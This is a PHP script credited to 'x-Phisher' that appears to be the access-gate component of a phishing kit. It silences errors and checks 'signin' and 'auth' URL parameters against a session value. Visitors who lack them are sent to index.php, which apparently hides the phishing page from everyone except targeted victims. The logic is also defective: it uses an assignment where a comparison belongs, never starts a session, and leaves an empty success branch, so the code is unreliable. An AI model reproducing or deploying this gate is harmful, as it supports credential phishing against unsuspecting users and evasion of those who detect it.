<?php 
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
error_reporting(0);
if (isset($_GET['signin'])) {
	if ($_GET['auth']) {
		if (isset($_SESSION ['authenticator'])) {
			if ($_GET['signin'] != "") {				
				if ($_GET['auth'] != "") {
					$url = "?signin=".$_GET['signin']."&auth=".$_GET['auth'];
                    $_SESSION ['authenticator'] = $authorization = $_SESSION ['authenticator'];
                    if ($url = $authorization) {
                    	# code...
                    }else{
                    	include($path."index.php");
		                exit();
                    }
				}else{
					include($path."index.php");
		            exit();
				}
			}else{
			    include($path."index.php");
		        exit();
		    }
		}else{
			include($path."index.php");
		exit();
	    }
	}else{
		include($path."index.php");
		exit();
	}
}else{
	include($path."index.php");
	exit();
}
?>